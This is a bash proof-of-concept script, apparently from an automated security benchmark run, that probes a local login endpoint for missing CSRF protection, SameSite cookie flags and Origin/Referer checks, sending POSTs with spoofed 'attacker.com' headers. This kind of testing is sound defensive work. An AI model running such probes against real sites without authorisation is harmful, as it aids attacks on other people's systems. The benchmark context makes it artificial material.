#!/bin/bash
# POC: Demonstrates CSRF vulnerability on login endpoint by sending login request with attacker origin/referer headers and verifying lack of CSRF token validation
# Target: ./repo
# Created: 2025-11-07T16:02:09.944Z
# Session: benchmark-XBEN-091-24-mhp1edtw

# CSRF Protection Test on Login Endpoint
# This POC demonstrates the absence of CSRF protection on the login form

TARGET_URL="http://localhost:5003"
LOGIN_ENDPOINT="${TARGET_URL}/login"

echo "=========================================="
echo "CSRF Protection POC - Login Endpoint"
echo "=========================================="
echo ""

# Test 1: Check if login form contains CSRF token
echo "[*] Test 1: Checking for CSRF token in login form..."
echo "[*] Fetching GET /login response..."

FORM_RESPONSE=$(curl -s -X GET "${LOGIN_ENDPOINT}" \
  -H "User-Agent: Mozilla/5.0")

# Check for common CSRF token field names
if echo "$FORM_RESPONSE" | grep -qE "csrf_token|_token|token.*hidden|__RequestVerificationToken"; then
    echo "[+] CSRF token field found in form"
    echo "[+] Token name detected:"
    echo "$FORM_RESPONSE" | grep -oE "name=\"[^\"]*token[^\"]*\"" | head -3
else
    echo "[-] NO CSRF token field detected in login form"
    echo "[!] VULNERABLE: Form lacks CSRF token protection"
fi

echo ""
echo "[*] Test 2: Attempting login from different origin (simulating CSRF attack)..."
echo "[*] Sending POST request with attacker origin/referer headers..."

# Test 2: POST login request from different origin without CSRF token
CSRF_TEST=$(curl -s -i -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/malicious" \
  -H "User-Agent: Mozilla/5.0" \
  -d "username=testuser&password=testpass" 2>&1)

echo "$CSRF_TEST" | head -20
echo ""

# Check response for CSRF validation errors
if echo "$CSRF_TEST" | grep -qiE "csrf|token.*invalid|forbidden|403"; then
    echo "[+] Server validated CSRF token/origin - Response contains CSRF validation"
else
    echo "[-] NO CSRF validation in response"
    echo "[!] VULNERABLE: Server accepted request from different origin"
fi

echo ""
echo "[*] Test 3: Checking for SameSite cookie attribute..."

# Test 3: Check Set-Cookie headers for SameSite attribute
SET_COOKIE=$(curl -s -i -X GET "${LOGIN_ENDPOINT}" \
  -H "User-Agent: Mozilla/5.0" 2>&1 | grep -i "Set-Cookie")

if [ -z "$SET_COOKIE" ]; then
    echo "[-] No Set-Cookie headers found"
else
    echo "[*] Set-Cookie headers found:"
    echo "$SET_COOKIE"
    
    if echo "$SET_COOKIE" | grep -qi "SameSite"; then
        echo "[+] SameSite attribute is present"
    else
        echo "[-] NO SameSite attribute detected"
        echo "[!] VULNERABLE: Cookies lack SameSite protection"
    fi
fi

echo ""
echo "[*] Test 4: Checking for Origin/Referer validation..."

# Test 4: Send request without Origin header but from different referer
ORIGIN_TEST=$(curl -s -w "\nHTTP_STATUS:%{http_code}\n" -X POST "${LOGIN_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://external.com/page" \
  -d "username=user&password=pass" 2>&1)

HTTP_STATUS=$(echo "$ORIGIN_TEST" | grep "HTTP_STATUS" | cut -d: -f2)

if [ "$HTTP_STATUS" = "403" ] || [ "$HTTP_STATUS" = "400" ]; then
    echo "[+] Server rejected request (HTTP $HTTP_STATUS) - Origin/Referer validation may be in place"
else
    echo "[-] Server accepted request (HTTP $HTTP_STATUS)"
    echo "[!] VULNERABLE: No Origin/Referer validation detected"
fi

echo ""
echo "=========================================="
echo "CSRF VULNERABILITY ASSESSMENT COMPLETE"
echo "=========================================="